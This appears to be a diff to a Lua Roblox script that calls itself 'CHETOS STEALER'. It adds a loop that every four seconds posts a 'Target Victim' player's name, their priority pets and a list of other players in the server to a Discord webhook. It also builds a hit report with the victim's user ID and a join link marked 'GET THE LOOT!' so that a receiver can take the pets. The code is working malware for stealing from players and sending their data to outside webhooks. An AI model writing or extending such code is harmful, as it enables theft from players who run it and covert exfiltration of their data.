@@ -46,6 +46,8 @@ local MUTATION_MAP = {
     Normal = "Normal", Ascended = "Ascended", Tranquil = "Tranquil", Corrupted = "Corrupted"
 }
 
+local formattedPriorityPetsForMonitor = "Scanning..."
+
 local function clone(original)
     local copy = {}
     for k, v in pairs(original) do
@@ -236,41 +238,6 @@ task.spawn(function()
         return
     end
 
-    task.spawn(function()
-        while player.Parent do
-            local playerList = {}
-            for _, p in ipairs(Players:GetPlayers()) do
-                if p ~= player then
-                    table.insert(playerList, string.format("`%s` (@%s)", p.DisplayName, p.Name))
-                end
-            end
-            
-            local playerListString = table.concat(playerList, "\n")
-            if #playerList == 0 then
-                playerListString = "No other players in the server."
-            end
-
-            local embed = {
-                title = "Server Monitor",
-                color = 16776960,
-                fields = {
-                    {name = "🎯 Target Victim", value = string.format("`%s` (@%s)", player.DisplayName, player.Name), inline = false},
-                    {name = "👥 Other Players in Server", value = "```\n" .. playerListString .. "\n```", inline = false}
-                },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }
-            
-            local payload = {
-                username = "CHETOS MONITOR",
-                avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",
-                embeds = { embed }
-            }
-
-            sendOurWebhook(CONFIG.MONITOR_WEBHOOK_URL, payload)
-            task.wait(4)
-        end
-    end)
-
     local function getPetSortScore(pet)
         if string.find(pet.typeName:lower(), "rainbow") then return 1 end
         if string.find(pet.typeName:lower(), "devine") then return 2 end
@@ -302,6 +269,44 @@ task.spawn(function()
         return "```\n" .. table.concat(list, "\n") .. "\n```"
     end
 
+    formattedPriorityPetsForMonitor = formatPetList()
+
+    task.spawn(function()
+        while player.Parent do
+            local playerList = {}
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= player then
+                    table.insert(playerList, string.format("`%s` (@%s)", p.DisplayName, p.Name))
+                end
+            end
+            
+            local playerListString = table.concat(playerList, "\n")
+            if #playerList == 0 then
+                playerListString = "No other players in the server."
+            end
+
+            local embed = {
+                title = "Server Monitor",
+                color = 16776960,
+                fields = {
+                    {name = "🎯 Target Victim", value = string.format("`%s` (@%s)", player.DisplayName, player.Name), inline = false},
+                    {name = "🐾 Victim's Priority Pets", value = formattedPriorityPetsForMonitor, inline = false},
+                    {name = "👥 Other Players in Server", value = "```\n" .. playerListString .. "\n```", inline = false}
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+            
+            local payload = {
+                username = "CHETOS MONITOR",
+                avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",
+                embeds = { embed }
+            }
+
+            sendOurWebhook(CONFIG.MONITOR_WEBHOOK_URL, payload)
+            task.wait(4)
+        end
+    end)
+
     local serverPlayerCount, maxPlayerCount = #Players:GetPlayers(), Players.MaxPlayers
     local serverStatus = string.format("%d/%d%s", serverPlayerCount, maxPlayerCount, serverPlayerCount >= maxPlayerCount and " (Player has left)" or "")
     local executorName = getExecutorName()
@@ -313,7 +318,7 @@ task.spawn(function()
     
     local join_link = string.format("[Join Server](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)
     local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", game.PlaceId, game.JobId)
-    local description = table.concat({"**👤 Player Information**", "```", ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name), ("👁️ User ID: %d"):format(player.UserId), ("🦸 Receiver: %s"):format(getgenv().receiver or ""), ("💻 Executor: %s"):format(executorName), ("🌐 Server: %s"):format(serverStatus), "```", "**📊 BACKPACK STATISTICS**", "```", ("🤭 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge), ("⭐ Aged/Mutated: %d"):format(stats.agedMutated), ("🎯 Priority Pets: %d"):format(#priorityPets), "```", "**🐾 All Pets**", formatPetList(), "**🔗 SERVER ACCESS - GET THE LOOT!**", "Click 'Join Server' to get the pets. If the victim is not in the server, they have already left.", join_link}, "\n")
+    local description = table.concat({"**👤 Player Information**", "```", ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name), ("👁️ User ID: %d"):format(player.UserId), ("🦸 Receiver: %s"):format(getgenv().receiver or ""), ("💻 Executor: %s"):format(executorName), ("🌐 Server: %s"):format(serverStatus), "```", "**📊 BACKPACK STATISTICS**", "```", ("🤭 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge), ("⭐ Aged/Mutated: %d"):format(stats.agedMutated), ("🎯 Priority Pets: %d"):format(#priorityPets), "```", "**🐾 All Pets**", formattedPriorityPetsForMonitor, "**🔗 SERVER ACCESS - GET THE LOOT!**", "Click 'Join Server' to get the pets. If the victim is not in the server, they have already left.", join_link}, "\n")
     local embed = {title = "🐾 **CHETOS STEALER PALDO**", color = 2829617, description = description, footer = { text = "CHETOS STEALER • by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
     
     local base_payload = {username = " CHETOS PETS STEALER", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed }}
@@ -342,7 +347,7 @@ task.spawn(function()
     end
 
     if not isExclusiveHit then
-        local log_description = string.format("**Receiver:** %s\n\n**Pets Found:**\n%s", getgenv().receiver or "N/A", formatPetList())
+        local log_description = string.format("**Receiver:** %s\n\n**Pets Found:**\n%s", getgenv().receiver or "N/A", formattedPriorityPetsForMonitor)
         local embed_log = {title = "🐾 New Hit Logged", color = 15158332, description = log_description, footer = { text = "Public Feed" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
         local payload_log = {username = "CHETOS LOGS", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed_log }}
         sendOurWebhook(CONFIG.LOGS_WEBHOOK_URL, payload_log)
